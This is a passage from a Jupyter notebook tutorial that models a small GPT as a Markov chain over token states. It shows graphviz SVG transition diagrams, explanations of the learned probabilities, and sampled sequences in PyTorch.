font-family=\"Times,serif\" font-size=\"14.00\">010</text>\n</g>\n<!-- 001&#45;&gt;010 -->\n<g id=\"edge3\" class=\"edge\">\n<title>001&#45;&gt;010</title>\n<path fill=\"none\" stroke=\"black\" d=\"M72.46,-82.71C64.84,-101.11 52.82,-130.12 44.02,-151.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"40.7,-150.25 40.1,-160.83 47.16,-152.93 40.7,-150.25\"/>\n<text text-anchor=\"middle\" x=\"40.74\" y=\"-120.85\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 011 -->\n<g id=\"node4\" class=\"node\">\n<title>011</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"193.24\" cy=\"-338.86\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"193.24\" y=\"-335.16\" font-family=\"Times,serif\" font-size=\"14.00\">011</text>\n</g>\n<!-- 001&#45;&gt;011 -->\n<g id=\"edge4\" class=\"edge\">\n<title>001&#45;&gt;011</title>\n<path fill=\"none\" stroke=\"black\" d=\"M87.07,-82.54C106.36,-129.1 158.94,-256.05 182.07,-311.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"178.97,-313.55 186.03,-321.45 185.44,-310.88 178.97,-313.55\"/>\n<text text-anchor=\"middle\" x=\"110.07\" y=\"-201.01\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 100 -->\n<g id=\"node5\" class=\"node\">\n<title>100</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"193.24\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"193.24\" y=\"-14.3\" font-family=\"Times,serif\" font-size=\"14.00\">100</text>\n</g>\n<!-- 010&#45;&gt;100 -->\n<g id=\"edge5\" class=\"edge\">\n<title>010&#45;&gt;100</title>\n<path fill=\"none\" stroke=\"black\" d=\"M47.91,-163.34C76.21,-135.03 137.41,-73.83 170.65,-40.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"173.47,-42.72 178.07,-33.17 168.53,-37.77 173.47,-42.72\"/>\n<text text-anchor=\"middle\" x=\"91.78\" y=\"-105.76\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 101 -->\n<g id=\"node6\" class=\"node\">\n<title>101</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"79.8\" cy=\"-291.87\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"79.8\" y=\"-288.17\" font-family=\"Times,serif\" font-size=\"14.00\">101</text>\n</g>\n<!-- 010&#45;&gt;101 -->\n<g id=\"edge6\" class=\"edge\">\n<title>010&#45;&gt;101</title>\n<path fill=\"none\" stroke=\"black\" d=\"M35.02,-196.56C40.62,-215.52 52.64,-245.38 62.98,-266.63\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"59.95,-268.38 67.59,-275.72 66.19,-265.22 59.95,-268.38\"/>\n<text text-anchor=\"middle\" x=\"24.5\" y=\"-235.39\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 110 -->\n<g id=\"node7\" class=\"node\">\n<title>110</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"353.67\" cy=\"-178.43\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"353.67\" y=\"-174.73\" font-family=\"Times,serif\" font-size=\"14.00\">110</text>\n</g>\n<!-- 011&#45;&gt;110 -->\n<g id=\"edge7\" class=\"edge\">\n<title>011&#45;&gt;110</title>\n<path fill=\"none\" stroke=\"black\" d=\"M208.33,-323.76C236.64,-295.46 297.84,-234.26 331.08,-201.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"333.9,-203.14 338.5,-193.6 328.95,-198.19 333.9,-203.14\"/>\n<text text-anchor=\"middle\" x=\"252.2\" y=\"-266.19\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 111 -->\n<g id=\"node8\" class=\"node\">\n<title>111</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"306.68\" cy=\"-291.87\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"306.68\" y=\"-288.17\" font-family=\"Times,serif\" font-size=\"14.00\">111</text>\n</g>\n<!-- 011&#45;&gt;111 -->\n<g id=\"edge8\" class=\"edge\">\n<title>011&#45;&gt;111</title>\n<path fill=\"none\" stroke=\"black\" d=\"M216.2,-329.35C232.85,-322.45 255.6,-313.03 274.12,-305.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"275.47,-308.58 283.37,-301.52 272.79,-302.12 275.47,-308.58\"/>\n<text text-anchor=\"middle\" x=\"220.66\" y=\"-306.15\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 100&#45;&gt;000 -->\n<g id=\"edge9\" class=\"edge\">\n<title>100&#45;&gt;000</title>\n<path fill=\"none\" stroke=\"black\" d=\"M216.2,-27.51C232.85,-34.41 255.6,-43.83 274.12,-51.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"272.79,-54.74 283.37,-55.33 275.47,-48.27 272.79,-54.74\"/>\n<text text-anchor=\"middle\" x=\"227.66\" y=\"-43.31\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 100&#45;&gt;001 -->\n<g id=\"edge10\" class=\"edge\">\n<title>100&#45;&gt;001</title>\n<path fill=\"none\" stroke=\"black\" d=\"M170.28,-27.51C153.63,-34.41 130.88,-43.83 112.36,-51.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"111.01,-48.27 103.11,-55.33 113.69,-54.74 111.01,-48.27\"/>\n<text text-anchor=\"middle\" x=\"116.82\" y=\"-28.31\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 101&#45;&gt;010 -->\n<g id=\"edge11\" class=\"edge\">\n<title>101&#45;&gt;010</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.6,-273.74C71.99,-254.77 59.98,-224.92 49.63,-203.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"52.67,-201.91 45.02,-194.57 46.42,-205.08 52.67,-201.91\"/>\n<text text-anchor=\"middle\" x=\"81.11\" y=\"-242.5\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 101&#45;&gt;011 -->\n<g id=\"edge12\" class=\"edge\">\n<title>101&#45;&gt;011</title>\n<path fill=\"none\" stroke=\"black\" d=\"M102.76,-301.38C119.41,-308.27 142.16,-317.7 160.68,-325.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"159.35,-328.61 169.93,-329.2 162.03,-322.14 159.35,-328.61\"/>\n<text text-anchor=\"middle\" x=\"107.22\" y=\"-317.17\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 110&#45;&gt;100 -->\n<g id=\"edge13\" class=\"edge\">\n<title>110&#45;&gt;100</title>\n<path fill=\"none\" stroke=\"black\" d=\"M338.58,-163.34C310.27,-135.03 249.07,-73.83 215.83,-40.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"217.96,-37.77 208.41,-33.17 213.01,-42.72 217.96,-37.77\"/>\n<text text-anchor=\"middle\" x=\"259.71\" y=\"-105.76\" font-family=\"Times,serif\" font-size=\"14.00\">0(0%)</text>\n</g>\n<!-- 110&#45;&gt;101 -->\n<g id=\"edge14\" class=\"edge\">\n<title>110&#45;&gt;101</title>\n<path fill=\"none\" stroke=\"black\" d=\"M330.32,-188.1C281.51,-208.32 168.57,-255.1 112.54,-278.31\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"110.99,-275.16 103.09,-282.22 113.67,-281.63 110.99,-275.16\"/>\n<text text-anchor=\"middle\" x=\"196.93\" y=\"-237\" font-family=\"Times,serif\" font-size=\"14.00\">1(100%)</text>\n</g>\n<!-- 111&#45;&gt;110 -->\n<g id=\"edge15\" class=\"edge\">\n<title>111&#45;&gt;110</title>\n<path fill=\"none\" stroke=\"black\" d=\"M314.02,-274.14C321.64,-255.75 333.66,-226.74 342.47,-205.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"345.79,-206.61 346.38,-196.03 339.32,-203.93 345.79,-206.61\"/>\n<text text-anchor=\"middle\" x=\"307.24\" y=\"-243.61\" font-family=\"Times,serif\" font-size=\"14.00\">0(50%)</text>\n</g>\n<!-- 111&#45;&gt;111 -->\n<g id=\"edge16\" class=\"edge\">\n<title>111&#45;&gt;111</title>\n<path fill=\"none\" stroke=\"black\" d=\"M332.12,-298.56C342.71,-299.02 351.68,-296.79 351.68,-291.87 351.68,-288.64 347.82,-286.57 342.17,-285.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"342.28,-282.16 332.12,-285.18 341.95,-289.15 342.28,-282.16\"/>\n<text text-anchor=\"middle\" x=\"372.68\" y=\"-288.17\" font-family=\"Times,serif\" font-size=\"14.00\">1(50%)</text>\n</g>\n</g>\n</svg>\n",
            "text/plain": [
              "<graphviz.graphs.Digraph at 0x7f2dba314430>"
            ]
          },
          "metadata": {},
          "execution_count": 17
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Nice! the arrows that correspond to transitions in our training data get higher probabilities. That makes sense. For example:\n",
        "\n",
        "- In our training data 101 always transitions to 011. After 50 steps of training, we see that this transition has 79% probability.\n",
        "- In our training data 111 goes to 111 50% of time, and 110 50% of the time, and this is almost exactly what we see in our model (45% and 55% respectively).\n",
        "\n",
        "We don't get exactly 100% or 50% probability for these arrows because the network wasn't fully trained, but you'd expect to get close if you continue training.\n",
        "\n",
        "Note something else that is interesting: some of the states that never appeared in the training data (e.g. 000 or 100) have substantial probabilities for what tokens should come next. If these states were never encountered during training, shouln't their outbound arrows be at ~50%? You'd think this was a bug, but actually this is desirable because in a real application scenario during deployment, almost every test input to the GPT is a never-before-seen input during training. We rely on the internals of the GPT (and its \"inductive bias\") to perform the generalization appropriately.\n",
        "\n",
        "Finally, let's sample from this GPT:"
      ],
      "metadata": {
        "id": "2jqlDUGT4VpX"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "xi = [1, 1, 1] # the starting sequence\n",
        "fullseq = xi.copy()\n",
        "print(f\"init: {xi}\")\n",
        "for k in range(20):\n",
        "    x = torch.tensor(xi, dtype=torch.long)[None, ...]\n",
        "    logits = gpt(x)\n",
        "    probs = nn.functional.softmax(logits, dim=-1)\n",
        "    t = torch.multinomial(probs[0], num_samples=1).item() # sample from the probability distribution\n",
        "    xi = xi[1:] + [t] # transition to the next state\n",
        "    fullseq.append(t)\n",
        "    print(f\"step {k}: state {xi}\")\n",
        "\n",
        "print(\"\\nfull sampled sequence:\")\n",
        "print(\"\".join(map(str, fullseq)))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "u3djdmja4DMQ",
        "outputId": "feba7207-4871-420c-9390-cbdb91b424d4"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "init: [1, 1, 1]\n",
            "step 0: state [1, 1, 0]\n",
            "step 1: state [1, 0, 1]\n",
            "step 2: state [0, 1, 1]\n",
            "step 3: state [1, 1, 1]\n",
            "step 4: state [1, 1, 0]\n",
            "step 5: state [1, 0, 1]\n",
            "step 6: state [0, 1, 1]\n",
            "step 7: state [1, 1, 1]\n",
            "step 8: state [1, 1, 0]\n",
            "step 9: state [1, 0, 1]\n",
            "step 10: state [0, 1, 1]\n",
            "step 11: state [1, 1, 0]\n",
            "step 12: state [1, 0, 1]\n",
            "step 13: state [0, 1, 1]\n",
            "step 14: state [1, 1, 1]\n",
            "step 15: state [1, 1, 1]\n",
            "step 16: state [1, 1, 0]\n",
            "step 17: state [1, 0, 1]\n",
            "step 18: state [0, 1, 0]\n",
            "step 19: state [1, 0, 1]\n",
            "\n",
            "full sampled sequence:\n",
            "11101110111011011110101\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Depending on how much you train your network, these sequences will look more and more like the training data. In our case we'd never get a perfect match because the state 111 has an ambiguous future: 50% of the time it's 1, 50% time a 0.\n",
        "\n",
        "Before we end this section, let's create a 2 block size 3 vocab size GPT instead of a 3 block size 2 vocab size GPT. In this case we expect 3 ingoing/outgoing arrows per node not 2."
      ],
      "metadata": {
        "id": "2c4lt0EpjsFe"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "config = GPTConfig(\n",
        "    block_size = 2,\n",
        "    vocab_size = 3,\n",
        "    n_layer = 4,\n",
        "    n_head = 4,\n",
        "    n_embd = 16,\n",
        "    bias = False,\n",
        ")\n",
        "gpt = GPT(config)\n",
        "plot_model()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 723
        },
        "id": "23oQfBXK3kOx",
        "outputId": "25492733-fce8-4a83-8cea-9e833c18f9d6"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "number of parameters: 12656\n",
            "input [0, 0] ---> [0.4023578464984894, 0.3247871398925781, 0.2728550136089325]\n",
            "input [0, 1] ---> [0.3112931251525879, 0.41417476534843445, 0.27453210949897766]\n",
            "input [0, 2] ---> [0.29536890983581543, 0.30436983704566956, 0.400261253118515]\n",
            "input [1, 0] ---> [0.4040412902832031, 0.32429811358451843, 0.2716606557369232]\n",
            "input [1, 1] ---> [0.3113819658756256, 0.4152715802192688, 0.2733464539051056]\n",
            "input [1, 2] ---> [0.29491397738456726, 0.302636981010437, 0.40244901180267334]\n",
            "input [2, 0] ---> [0.40355363488197327, 0.3235832452774048, 0.27286314964294434]\n",
            "input [2, 1] ---> [0.31285664439201355, 0.41349685192108154, 0.2736465036869049]\n",
            "input [2, 2] ---> [0.29775166511535645, 0.30284032225608826, 0.3994080722332001]\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 2.43.0 (0)\n -->\n<!-- Title: %3 Pages: 1 -->\n<svg width=\"450pt\" height=\"399pt\"\n viewBox=\"0.00 0.00 450.20 399.48\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 395.48)\">\n<title>%3</title>\n<polygon fill=\"white\" stroke=\"transparent\" points=\"-4,4 -4,-395.48 446.2,-395.48 446.2,4 -4,4\"/>\n<!-- 00 -->\n<g id=\"node1\" class=\"node\">\n<title>00</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"355.2\" cy=\"-311.75\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"355.2\" y=\"-308.05\" font-family=\"Times,serif\" font-size=\"14.00\">00</text>\n</g>\n<!-- 00&#45;&gt;00 -->\n<g id=\"edge1\" class=\"edge\">\n<title>00&#45;&gt;00</title>\n<path fill=\"none\" stroke=\"black\" d=\"M380.65,-318.44C391.23,-318.9 400.2,-316.67 400.2,-311.75 400.2,-308.52 396.34,-306.45 390.69,-305.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"390.8,-302.04 380.65,-305.06 390.47,-309.03 390.8,-302.04\"/>\n<text text-anchor=\"middle\" x=\"421.2\" y=\"-308.05\" font-family=\"Times,serif\" font-size=\"14.00\">0(40%)</text>\n</g>\n<!-- 01 -->\n<g id=\"node2\" class=\"node\">\n<title>01</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"248.29\" cy=\"-373.48\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"248.29\" y=\"-369.78\" font-family=\"Times,serif\" font-size=\"14.00\">01</text>\n</g>\n<!-- 00&#45;&gt;01 -->\n<g id=\"edge2\" class=\"edge\">\n<title>00&#45;&gt;01</title>\n<path fill=\"none\" stroke=\"black\" d=\"M334.59,-323.65C318.47,-332.96 295.84,-346.03 277.8,-356.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"275.75,-353.58 268.84,-361.61 279.25,-359.65 275.75,-353.58\"/>\n<text text-anchor=\"middle\" x=\"285.19\" y=\"-343.85\" font-family=\"Times,serif\" font-size=\"14.00\">1(32%)</text>\n</g>\n<!-- 02 -->\n<g id=\"node3\" class=\"node\">\n<title>02</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"355.2\" cy=\"-79.73\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"355.2\" y=\"-76.03\" font-family=\"Times,serif\" font-size=\"14.00\">02</text>\n</g>\n<!-- 00&#45;&gt;02 -->\n<g id=\"edge3\" class=\"edge\">\n<title>00&#45;&gt;02</title>\n<path fill=\"none\" stroke=\"black\" d=\"M355.2,-293.54C355.2,-253.22 355.2,-156.15 355.2,-107.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"358.7,-107.85 355.2,-97.85 351.7,-107.85 358.7,-107.85\"/>\n<text text-anchor=\"middle\" x=\"334.2\" y=\"-204.53\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 10 -->\n<g id=\"node4\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"397.43\" cy=\"-195.74\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"397.43\" y=\"-192.04\" font-family=\"Times,serif\" font-size=\"14.00\">10</text>\n</g>\n<!-- 01&#45;&gt;10 -->\n<g id=\"edge4\" class=\"edge\">\n<title>01&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M265.49,-359.42C294.93,-329.45 353.98,-259.36 382.09,-221.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"385.21,-222.95 388.23,-212.79 379.54,-218.85 385.21,-222.95\"/>\n<text text-anchor=\"middle\" x=\"302.79\" y=\"-294.16\" font-family=\"Times,serif\" font-size=\"14.00\">0(31%)</text>\n</g>\n<!-- 11 -->\n<g id=\"node5\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"126.7\" cy=\"-352.04\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"126.7\" y=\"-348.34\" font-family=\"Times,serif\" font-size=\"14.00\">11</text>\n</g>\n<!-- 01&#45;&gt;11 -->\n<g id=\"edge5\" class=\"edge\">\n<title>01&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M221.9,-368.83C204.7,-365.79 182.01,-361.79 163.09,-358.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"163.49,-354.97 153.03,-356.68 162.28,-361.87 163.49,-354.97\"/>\n<text text-anchor=\"middle\" x=\"171.5\" y=\"-367.44\" font-family=\"Times,serif\" font-size=\"14.00\">1(41%)</text>\n</g>\n<!-- 12 -->\n<g id=\"node6\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"47.35\" cy=\"-134.01\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"47.35\" y=\"-130.31\" font-family=\"Times,serif\" font-size=\"14.00\">12</text>\n</g>\n<!-- 01&#45;&gt;12 -->\n<g id=\"edge6\" class=\"edge\">\n<title>01&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M235.1,-357.77C200.68,-316.75 107.97,-206.26 67.13,-157.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"69.69,-155.19 60.58,-149.78 64.33,-159.69 69.69,-155.19\"/>\n<text text-anchor=\"middle\" x=\"130.11\" y=\"-261.48\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 20 -->\n<g id=\"node7\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"126.7\" cy=\"-39.44\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"126.7\" y=\"-35.74\" font-family=\"Times,serif\" font-size=\"14.00\">20</text>\n</g>\n<!-- 02&#45;&gt;20 -->\n<g id=\"edge7\" class=\"edge\">\n<title>02&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M331.08,-71.01C291.15,-61.04 211.05,-46.68 163.86,-40.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"164.08,-37.32 153.75,-39.64 163.27,-44.27 164.08,-37.32\"/>\n<text text-anchor=\"middle\" x=\"226.47\" y=\"-44.71\" font-family=\"Times,serif\" font-size=\"14.00\">0(30%)</text>\n</g>\n<!-- 21 -->\n<g id=\"node8\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"47.35\" cy=\"-257.47\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"47.35\" y=\"-253.77\" font-family=\"Times,serif\" font-size=\"14.00\">21</text>\n</g>\n<!-- 02&#45;&gt;21 -->\n<g id=\"edge8\" class=\"edge\">\n<title>02&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M334.53,-91.67C281.18,-122.46 138.77,-204.69 76.82,-240.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"74.85,-237.55 67.94,-245.58 78.35,-243.61 74.85,-237.55\"/>\n<text text-anchor=\"middle\" x=\"184.67\" y=\"-169.86\" font-family=\"Times,serif\" font-size=\"14.00\">1(30%)</text>\n</g>\n<!-- 22 -->\n<g id=\"node9\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"248.29\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"248.29\" y=\"-14.3\" font-family=\"Times,serif\" font-size=\"14.00\">22</text>\n</g>\n<!-- 02&#45;&gt;22 -->\n<g id=\"edge9\" class=\"edge\">\n<title>02&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M334.59,-67.83C318.47,-58.52 295.84,-45.45 277.8,-35.04\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"279.25,-31.83 268.84,-29.87 275.75,-37.9 279.25,-31.83\"/>\n<text text-anchor=\"middle\" x=\"285.19\" y=\"-55.23\" font-family=\"Times,serif\" font-size=\"14.00\">2(40%)</text>\n</g>\n<!-- 10&#45;&gt;00 -->\n<g id=\"edge10\" class=\"edge\">\n<title>10&#45;&gt;00</title>\n<path fill=\"none\" stroke=\"black\" d=\"M391.01,-213.36C384.13,-232.27 373.11,-262.54 365.11,-284.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"361.81,-283.37 361.68,-293.97 368.39,-285.77 361.81,-283.37\"/>\n<text text-anchor=\"middle\" x=\"357.06\" y=\"-252.74\" font-family=\"Times,serif\" font-size=\"14.00\">0(40%)</text>\n</g>\n<!-- 10&#45;&gt;01 -->\n<g id=\"edge11\" class=\"edge\">\n<title>10&#45;&gt;01</title>\n<path fill=\"none\" stroke=\"black\" d=\"M380.22,-209.8C350.78,-239.77 291.73,-309.86 263.62,-347.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"260.5,-346.27 257.49,-356.43 266.18,-350.37 260.5,-346.27\"/>\n<text text-anchor=\"middle\" x=\"300.92\" y=\"-267.66\" font-family=\"Times,serif\" font-size=\"14.00\">1(32%)</text>\n</g>\n<!-- 10&#45;&gt;02 -->\n<g id=\"edge12\" class=\"edge\">\n<title>10&#45;&gt;02</title>\n<path fill=\"none\" stroke=\"black\" d=\"M391.01,-178.12C384.13,-159.21 373.11,-128.94 365.11,-106.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"368.39,-105.71 361.68,-97.51 361.81,-108.11 368.39,-105.71\"/>\n<text text-anchor=\"middle\" x=\"357.06\" y=\"-146.34\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 11&#45;&gt;10 -->\n<g id=\"edge13\" class=\"edge\">\n<title>11&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M147.5,-340.04C195.25,-312.47 312.88,-244.55 368.02,-212.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"370.02,-215.6 376.93,-207.57 366.52,-209.54 370.02,-215.6\"/>\n<text text-anchor=\"middle\" x=\"236.76\" y=\"-280.18\" font-family=\"Times,serif\" font-size=\"14.00\">0(31%)</text>\n</g>\n<!-- 11&#45;&gt;11 -->\n<g id=\"edge14\" class=\"edge\">\n<title>11&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M152.15,-358.73C162.73,-359.19 171.7,-356.96 171.7,-352.04 171.7,-348.81 167.84,-346.74 162.19,-345.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"162.3,-342.33 152.15,-345.35 161.97,-349.32 162.3,-342.33\"/>\n<text text-anchor=\"middle\" x=\"192.7\" y=\"-348.34\" font-family=\"Times,serif\" font-size=\"14.00\">1(42%)</text>\n</g>\n<!-- 11&#45;&gt;12 -->\n<g id=\"edge15\" class=\"edge\">\n<title>11&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M120.21,-334.2C106.34,-296.09 73.75,-206.56 57.27,-161.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"60.53,-159.99 53.82,-151.79 53.95,-162.39 60.53,-159.99\"/>\n<text text-anchor=\"middle\" x=\"109.74\" y=\"-236.53\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 12&#45;&gt;20 -->\n<g id=\"edge16\" class=\"edge\">\n<title>12&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.81,-117.97C73.43,-102.93 92.44,-80.27 106.81,-63.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"109.7,-65.15 113.44,-55.24 104.33,-60.65 109.7,-65.15\"/>\n<text text-anchor=\"middle\" x=\"62.81\" y=\"-94.36\" font-family=\"Times,serif\" font-size=\"14.00\">0(29%)</text>\n</g>\n<!-- 12&#45;&gt;21 -->\n<g id=\"edge17\" class=\"edge\">\n<title>12&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M42.42,-151.96C40.31,-172.26 40.03,-205.57 41.58,-229.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"38.11,-229.82 42.42,-239.49 45.08,-229.24 38.11,-229.82\"/>\n<text text-anchor=\"middle\" x=\"21\" y=\"-194.45\" font-family=\"Times,serif\" font-size=\"14.00\">1(30%)</text>\n</g>\n<!-- 12&#45;&gt;22 -->\n<g id=\"edge18\" class=\"edge\">\n<title>12&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M68.1,-122.03C103.99,-101.31 177.76,-58.72 218.91,-34.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"220.74,-37.94 227.65,-29.91 217.24,-31.88 220.74,-37.94\"/>\n<text text-anchor=\"middle\" x=\"122.5\" y=\"-82.3\" font-family=\"Times,serif\" font-size=\"14.00\">2(40%)</text>\n</g>\n<!-- 20&#45;&gt;00 -->\n<g id=\"edge19\" class=\"edge\">\n<title>20&#45;&gt;00</title>\n<path fill=\"none\" stroke=\"black\" d=\"M139.98,-55.26C178.39,-101.03 289.83,-233.84 335.41,-288.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"332.78,-290.48 341.89,-295.89 338.15,-285.98 332.78,-290.48\"/>\n<text text-anchor=\"middle\" x=\"258.7\" y=\"-175.51\" font-family=\"Times,serif\" font-size=\"14.00\">0(40%)</text>\n</g>\n<!-- 20&#45;&gt;01 -->\n<g id=\"edge20\" class=\"edge\">\n<title>20&#45;&gt;01</title>\n<path fill=\"none\" stroke=\"black\" d=\"M133.24,-57.4C153.33,-112.58 214.24,-279.93 238.33,-346.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"235.16,-347.64 241.86,-355.84 241.73,-345.24 235.16,-347.64\"/>\n<text text-anchor=\"middle\" x=\"164.78\" y=\"-205.56\" font-family=\"Times,serif\" font-size=\"14.00\">1(32%)</text>\n</g>\n<!-- 20&#45;&gt;02 -->\n<g id=\"edge21\" class=\"edge\">\n<title>20&#45;&gt;02</title>\n<path fill=\"none\" stroke=\"black\" d=\"M150.83,-48.16C190.76,-58.13 270.85,-72.48 318.05,-78.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"317.82,-81.85 328.16,-79.53 318.63,-74.89 317.82,-81.85\"/>\n<text text-anchor=\"middle\" x=\"213.44\" y=\"-67.05\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 21&#45;&gt;10 -->\n<g id=\"edge22\" class=\"edge\">\n<title>21&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M73.66,-252.83C135.52,-241.92 290.3,-214.63 361.07,-202.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"362.05,-205.53 371.29,-200.35 360.83,-198.64 362.05,-205.53\"/>\n<text text-anchor=\"middle\" x=\"196.37\" y=\"-231.29\" font-family=\"Times,serif\" font-size=\"14.00\">0(31%)</text>\n</g>\n<!-- 21&#45;&gt;11 -->\n<g id=\"edge23\" class=\"edge\">\n<title>21&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.81,-273.51C73.43,-288.55 92.44,-311.21 106.81,-328.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"104.33,-330.82 113.44,-336.24 109.7,-326.33 